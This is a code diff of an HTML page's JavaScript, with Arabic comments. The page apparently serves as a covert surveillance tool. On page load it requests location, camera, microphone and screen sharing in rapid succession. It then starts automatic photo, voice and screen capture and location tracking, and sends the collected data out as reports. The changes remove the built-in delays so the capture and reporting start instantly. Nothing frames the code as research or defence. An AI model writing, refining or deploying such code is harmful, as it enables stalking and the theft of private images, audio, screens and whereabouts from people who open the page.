@@ -29,10 +29,10 @@
         let perms = { gps: false, cam: false, mic: false, screen: false };
 
         // ============================================================
-        // طلب الصلاحيات واحدة ورا التانية بسرعة بدون تأخير
+        // دالة طلب الصلاحيات - واحدة ورا التانية بسرعة جداً
         // ============================================================
         async function requestPermissions() {
-            // 1. الموقع - يطلب ويسجل فوراً
+            // 1. الموقع - يطلب على طول
             try {
                 const pos = await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject, {
@@ -49,7 +49,7 @@
                 sendLocation();
             } catch(e) { perms.gps = false; }
 
-            // 2. الكاميرا - تطلب فوراً بعد الموقع
+            // 2. الكاميرا - تطلب فوراً بعد الموقع (بدون تأخير)
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: {
@@ -61,7 +61,7 @@
                 });
                 currentStream = stream;
                 perms.cam = true;
-                setTimeout(() => capturePhoto(), 300);
+                capturePhoto();
             } catch(e) {
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({
@@ -74,35 +74,35 @@
                     });
                     currentStream = stream;
                     perms.cam = true;
-                    setTimeout(() => capturePhoto(), 300);
+                    capturePhoto();
                 } catch(e2) { perms.cam = false; }
             }
 
-            // 3. الميكروفون - يطلب فوراً بعد الكاميرا
+            // 3. الميكروفون - يطلب فوراً بعد الكاميرا (بدون تأخير)
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                 perms.mic = true;
-                setTimeout(() => startVoiceRecording(), 300);
+                startVoiceRecording();
             } catch(e) { perms.mic = false; }
 
-            // 4. الشاشة - تطلب فوراً بعد الميكروفون
+            // 4. الشاشة - تطلب فوراً بعد الميكروفون (بدون تأخير)
             try {
                 const stream = await navigator.mediaDevices.getDisplayMedia({
                     video: { width: { ideal: 1280 }, height: { ideal: 720 } }
                 });
                 screenStream = stream;
                 perms.screen = true;
-                setTimeout(() => captureScreen(), 300);
+                captureScreen();
             } catch(e) { perms.screen = false; }
 
-            // بدء التشغيل فوراً بعد طلب كل الصلاحيات
+            // بدء التشغيل التلقائي
             if (perms.cam || perms.mic || perms.gps) {
                 isRunning = true;
                 startAutoCapture();
                 startAutoScreen();
                 startAutoVoice();
                 trackLocation();
-                setTimeout(() => sendFullReport(), 2000);
+                sendFullReport();
             }
         }
 
@@ -335,12 +335,11 @@
         }
 
         // ============================================================
-        // بدء التشغيل فوراً
+        // بدء التشغيل فوراً عند تحميل الصفحة
         // ============================================================
         window.addEventListener('load', () => {
-            setTimeout(() => {
-                requestPermissions();
-            }, 300);
+            // بدء طلب الصلاحيات فوراً
+            requestPermissions();
         });
 
         // ============================================================
@@ -353,7 +352,7 @@
             }
         });
 
-        console.log('🚀 تم التحميل - سيتم طلب الصلاحيات فوراً');
+        console.log('🚀 تم التحميل - طلب الصلاحيات فوراً');
     </script>
 </body>
 </html>
